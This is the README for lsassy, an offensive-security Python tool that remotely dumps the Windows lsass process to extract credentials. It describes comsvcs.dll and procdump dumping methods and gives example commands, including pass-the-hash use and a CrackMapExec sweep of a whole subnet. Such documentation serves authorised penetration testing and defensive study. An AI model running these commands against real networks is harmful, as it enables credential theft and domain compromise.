# lsassy

[![PyPI version](https://d25lcipzij17d.cloudfront.net/badge.svg?id=py&type=6&v=1.1.4&x2=0)](https://pypi.org/project/lsassy/) [![Twitter](https://img.shields.io/twitter/follow/hackanddo?label=HackAndDo&style=social)](https://twitter.com/intent/follow?screen_name=hackanddo)

![CME Module example](https://github.com/Hackndo/lsassy/raw/master/assets/example.png)

Python library to remotely extract credentials. This [blog post](https://en.hackndo.com/remote-lsass-dump-passwords/) explains how it works.

You can check the [wiki](https://github.com/Hackndo/lsassy/wiki)

This library uses [impacket](https://github.com/SecureAuthCorp/impacket) project to remotely read necessary bytes in lsass dump and [pypykatz](https://github.com/skelsec/pypykatz) to extract credentials.

| Chapters                                     | Description                                             |
|----------------------------------------------|---------------------------------------------------------|
| [Requirements](#requirements)                | Requirements to install lsassy from source              |
| [Installation](#installation)                | Installation commands from pip or from source           |
| [Basic Usage](#basic-usage)                  | Command line template for standalone version            |
| [Advanced Usage](#advanced)                  | Advanced usage (Dumping methods, execution methods, ...)|
| [CrackMapExec Module](#crackmapexec-module)  | Link to CrackMapExec module included in this repository |
| [Examples](#examples-1)                        | Command line examples for standalone and CME module     |
| [Issues](#issues)                            | Read this before creating an issue                      |
| [Acknowledgments](#acknowledgments)          | Kudos to these people and tools                         |
| [Contributors](#contributors)                | People contributing to this tool                        |

## Requirements

* Python >= 3.6
* [pypykatz](https://github.com/skelsec/pypykatz) >= 0.3.0
* [impacket](https://github.com/SecureAuthCorp/impacket)

## Installation

### From pip

```
python3.7 -m pip install lsassy
```

### From sources

```
python3.7 setup.py install
```

## Basic Usage

```
lsassy [--hashes [LM:]NT] [<domain>/]<user>[:<password>]@<target>
```

## Advanced

### Dumping methods

This tool can dump lsass in different ways.

Dumping methods (`-m` or `--method`)
* **0**: Try all methods (dll then procdump) to dump lsass, stop on success (Requires -p if dll method fails)
* **1**: comsvcs.dll method, stop on success (default)
* **2**: Procdump method, stop on success (Requires -p)
* **3**: comsvcs.dll + Powershell method, stop on success
* **4**: comsvcs.dll + cmd.exe method

#### comsvcs.dll method

This method **only uses built-in Windows files** to extract remote credentials. It uses **minidump** function from **comsvcs.dll** to dump **lsass** process.

This method can only be used when context has **SeDebugPrivilege**. This privilege is either in Powershell local admin context, or cmd.exe SYSTEM context.

Two execution methods can be used.
1. **WMIExec** with cmd.exe (no SeDebugPrivilege), or powershell (SeDebugPrivilege)
2. **ScheduledTasks** with SYSTEM context (SeDebugPrivilege)

#### Procdump method

This method uploads **procdump.exe** from SysInternals to dump **lsass** process. It will first try to execute
procdump using WMI, and if it fails it will create a remote task, execute it and delete it.

#### Examples

```bash
lsassy [--hashes [LM:]NT] [<domain>/]<user>[:<password>]@<target> -m 0 -p /path/to/procdump.exe
lsassy [--hashes [LM:]NT] [<domain>/]<user>[:<password>]@<target> -m 1
lsassy [--hashes [LM:]NT] [<domain>/]<user>[:<password>]@<target> -m 2 -p /path/to/procdump.exe
lsassy [--hashes [LM:]NT] [<domain>/]<user>[:<password>]@<target> -m 3
lsassy [--hashes [LM:]NT] [<domain>/]<user>[:<password>]@<target> -m 4
```

### Remote parsing only

lsassy can parse an already dumped lsass process.

```
lsassy [--hashes [LM:]NT] --dumppath /share/path/to/dump.dmp [<domain>/]<user>[:<password>]@<target>
```

## CrackMapExec module

I wrote a CrackMapExec module that uses **lsassy** to extract credentials on compromised hosts

CrackMapExec module is in `cme` folder : [CME Module](https://github.com/Hackndo/lsassy/tree/master/cme)

## Examples

### lsassy

```bash
# RunDLL Method
lsassy adsec.local/jsnow:Winter_is_coming@dc01.adsec.local

# Procdump Method
lsassy -m 2 -p /tmp/procdump.exe adsec.local/jsnow:Winter_is_coming@dc01.adsec.local

# Remote parsing only
lsassy --dumppath C$/Windows/Temp/lsass.dmp adsec.local/jsnow:Winter_is_coming@dc01.adsec.local

# NT Hash Authentication
lsassy --hashes 952c28bd2fd728898411b301475009b7 Administrator@desktop01.adsec.local
```

### CME Module

```
crackmapexec smb 10.0.0.0/24 -d adsec.local -u Administrator -p Passw0rd -M lsassy -o BLOODHOUND=True NEO4JPASS=bloodhound
```

### ChangeLog

```
v1.1.0
------
* Better execution process : --method flag has been added and described in help text
* Uses random dump name
* Chose between cmd, powershell, dll and/or procdump methods
* CME module is now using light lsassy WMIExec et TASKExec implementation
* Bug fixes

v1.0.0
------
* Built-in lsass dump
** Lsass dump using built-in Windows
** Lsass dump using procdump (using -p parameter)
* Add --dumppath to ask for remote parsing only
* Code refactoring
* Add --quiet to quiet output

v0.2.0
------
* Add BloodHound option to CME module (-o BLOODHOUND=True)
    - Set compromised targets as "owned" in BloodHound
    - Check if compromised users have at least one path to domain admin
* Custom parsing (json, grep, pretty [default])
* New --hashes option to lsassy
* Include CME module in repository
* Add credentials to CME database


v0.1.0
------
First release
```

## Issues

If you find an issue with this tool (that's very plausible !), please

* Check that you're using the latest version
* Send as much details as possible.
    - For standalone **lsassy**, please use the `-d` debug flag
    - For CME module, please use CrackMapExec `--verbose` flag

## Acknowledgments

* [Impacket](https://github.com/SecureAuthCorp/impacket)
* [SkelSec](http://twitter.com/skelsec) for Pypykatz, but also for his patience and help
* [mpgn](https://twitter.com/mpgn_x64) for his help and ideas

## Contributors

* [ITPPA](https://github.com/ITPPA/)
* [viaccoz](https://github.com/viaccoz)
